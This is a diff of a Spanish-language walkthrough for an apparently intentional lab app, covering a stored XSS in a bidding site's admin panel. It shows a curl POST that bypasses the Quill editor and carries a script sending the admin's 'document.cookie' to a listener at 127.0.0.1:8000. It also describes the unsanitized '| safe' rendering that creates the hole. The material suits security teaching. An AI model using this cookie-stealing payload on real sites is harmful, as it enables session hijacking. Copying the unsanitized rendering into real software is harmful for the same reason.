@@ -10,25 +10,30 @@
 
 ## Paso 1 — Stored XSS
 
-- **Que es:** inyeccion de HTML/JS persistente. La descripcion de una propuesta
-  admite **formato** (negritas con `**...**` y saltos de linea), asi que el panel
-  del admin la renderiza como HTML mediante el filtro `formato`
-  (`{{ p.descripcion | formato }}` en `templates/admin_licitacion.html`). Ese
-  filtro (`app.py`) genera el HTML del formato y lo devuelve con `Markup(...)`
-  **sin sanitizar** la entrada: solo procesa `**` y `\n`, pero deja pasar
-  cualquier otro HTML del usuario (incluido `<script>`). El resultado ya no se
-  escapa → XSS almacenado.
-- **Donde esta:** vector de entrada en `/propuesta/<id>` (campo Descripcion,
-  `descripcion = request.form.get(...)` sin sanitizar); se **dispara** en
-  `/admin/licitacion/<id>` cuando el admin la abre y el filtro `formato` la
-  renderiza.
-- **Como explotarla:**
+- **Que es:** inyeccion de HTML/JS persistente. El formulario de propuesta usa un
+  **editor de texto enriquecido (Quill)** para dar formato a la oferta (negrita,
+  cursiva, listas, enlaces), asi que la descripcion se guarda como **HTML** y el
+  panel del admin la renderiza con `{{ p.descripcion | safe }}`
+  (`templates/admin_licitacion.html`). El error es del servidor en **confiar** en 
+  que el editor del cliente ya limpio el contenido
+  y **no sanitiza en el backend** (`app.py`: `descripcion = request.form.get(...)`
+  se guarda tal cual) → XSS almacenado.
+- **Donde esta:** vector de entrada en `/propuesta/<id>` (campo Descripcion); se
+  **dispara** en `/admin/licitacion/<id>` cuando el admin la abre y el HTML crudo
+  se renderiza con `| safe`.
+- **Como explotarla:** el editor Quill filtra lo que se escribe/pega en la UI, asi
+  que hay que **saltear el editor** y mandar el POST directo (curl / DevTools / Burp)
+  con el HTML crudo, ya que el servidor no valida nada.
   1. Iniciar sesion como `atacante` / `hack123`.
-  2. Abrir una licitacion **abierta** y presentar una propuesta. Completar
-     razon social, CUIT valido (ej. `20-33333333-3`) y monto valido (ej. `999`).
-  3. En **Descripcion**, pegar un payload de robo de cookie como:
-     <script>fetch("http://127.0.0.1:8000/robo?c="+encodeURIComponent(document.cookie));</script>
-- **Resultado esperado:** al guardarse, el script queda persistido. Cuando el
+  2. Enviar el POST mediante la terminal con curl:
+      - curl -X POST http://127.0.0.1:5000/propuesta/<id> \
+        -b "sesion=<COOKIE_DEL_ATACANTE>" \
+        --data-urlencode "razon_social=ACME SA" \
+        --data-urlencode "cuit=20-33333333-3" \
+        --data-urlencode "monto=999" \
+        --data-urlencode "email_contacto=atacante@acme.com" \
+        --data-urlencode 'descripcion=<script>fetch("http://127.0.0.1:8000/robo?c="+encodeURIComponent(document.cookie))</script>'
+- **Resultado esperado:** al guardarse, el payload queda persistido. Cuando el
   admin abra esa licitacion, el codigo se ejecuta en **su** navegador.
 
 ---
